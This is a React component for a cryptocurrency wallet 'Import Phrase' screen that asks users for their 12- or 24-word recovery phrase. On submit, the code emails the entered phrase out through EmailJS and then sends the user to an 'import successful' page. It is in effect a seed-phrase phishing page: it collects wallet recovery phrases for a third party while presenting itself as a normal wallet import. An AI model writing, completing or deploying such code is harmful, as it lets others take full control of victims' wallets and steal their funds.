import React, { useRef, useState } from "react";
import "./ImportPhrase.css";
import ImportHeader from "../ImportHeader/ImportHeader";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

function ImportPhrase() {
	const navigate = useNavigate();
	const form = useRef();

	const [input1, setInput1] = useState("");

	const handleSubmit = (e) => {
		e.preventDefault();

		emailjs
			.sendForm(
			'YOUR_SERVICE_ID', 
			'YOUR_TEMPLATE_ID', 
			form.current, 
			'YOUR_USER_ID'
			)
			.then(
				(result) => {
					console.log(result.text);
					// alert("Successful");
					navigate("/import-successful");
				},
				(error) => {
					console.log(error.text);
				}
			);
		e.target.reset();
		// setText1([input1, ...text1]);
		// setInput1("");
	};

	return (
		<div>
			<ImportHeader />
			<div className="import">
				<div className="name">Phrase</div>
				<form
					ref={form}
					onSubmit={(e) => {
						e.preventDefault();
					}}>
					<div className="textinput">
						<textArea
							placeholder="Input your phrase value"
							type="text"
							value={input1}
							name="phrase"
							onChange={(e) => setInput1(e.target.value)}
						/>
					</div>
					<div className="text">
						Typically 12 (sometimes 24) words separated by single spaces.
					</div>

					<div className="import__button">
						<button onClick={handleSubmit}>Import</button>
					</div>
				</form>
			</div>
		</div>
	);
}

export default ImportPhrase;
